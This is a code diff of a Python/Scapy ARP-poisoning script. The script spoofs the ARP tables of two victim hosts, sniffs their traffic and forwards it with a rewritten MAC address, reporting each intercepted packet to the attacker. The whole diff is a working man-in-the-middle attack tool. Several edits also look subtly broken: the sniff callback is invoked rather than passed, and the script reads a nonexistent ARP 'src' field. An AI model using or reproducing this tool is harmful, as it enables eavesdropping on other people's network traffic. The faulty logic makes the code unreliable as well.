@@ -70,7 +70,7 @@ def arppoison():
         sendp(arp2, iface="enp0s3")
         
         # Call sniff to start sniffing for incoming packets from victims, and resend packets received via forward_packet
-        sniff(prn=forward_packet(packet), iface = "enp0s3")
+        sniff(prn=forward_packet(packet, ipVictimList, macVictimList, macAttacker), iface = "enp0s3")
 
         # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
         while(True):
@@ -85,17 +85,17 @@ def arppoison():
 
     
 # This method is used to forward the received packet we sniffed to the host it was intended to be sent to
-def forward_packet(packet):
-        if (packet[IP].dst == ipVictimList[1] and packet[Ether].dst == macAttacker):
+def forward_packet(packet, ipVictimList, macVictimList, macAttacker):
+        if (packet[ARP].pdst == ipVictimList[1] and packet[Ether].dst == macAttacker):
             # Once we have the IP address of the destination, we must change the MAC address to what it should have been if it was not spoofed
             packet[Ether].dst = macVictimList[1]
             # We also change the source MAC address to the attacker's MAC address so we can listen in on the response
             packet[Ether].src = macAttacker
             # Resend the packet to it's rightful destination
             sendp(packet)
-            print("A packet from " + str(packet[IP].src) + " has been redirected to " + str(packet[IP].dst))
+            print("A packet from " + str(packet[ARP].src) + " has been redirected to " + str(packet[ARP].pdst))
 
-        if (packet[IP].dst == ipVictimList[0] and packet[Ether].dst == macAttacker):
+        if (packet[ARP].pdst == ipVictimList[0] and packet[Ether].dst == macAttacker):
             # Once we have the IP address of the destination, we must change the MAC address to what it should have been if it was not spoofed
             packet[Ether].dst = macVictimList[0]
             # We also change the source MAC address to the attacker's MAC address so we can listen in on the response
@@ -103,9 +103,7 @@ def forward_packet(packet):
             # Resend the packet to it's rightful destination
             sendp(packet)
             # Let the attacker know who sent a packet to whom
-            print("A packet from " + str(packet[IP].src) + " has been redirected to " + str(packet[IP].dst))
+            print("A packet from " + str(packet[ARP].psrc) + " has been redirected to " + str(packet[ARP].pdst))
 
-            # If a match has been found we break out of the loop as only one match can be found
-            break
 
 main()
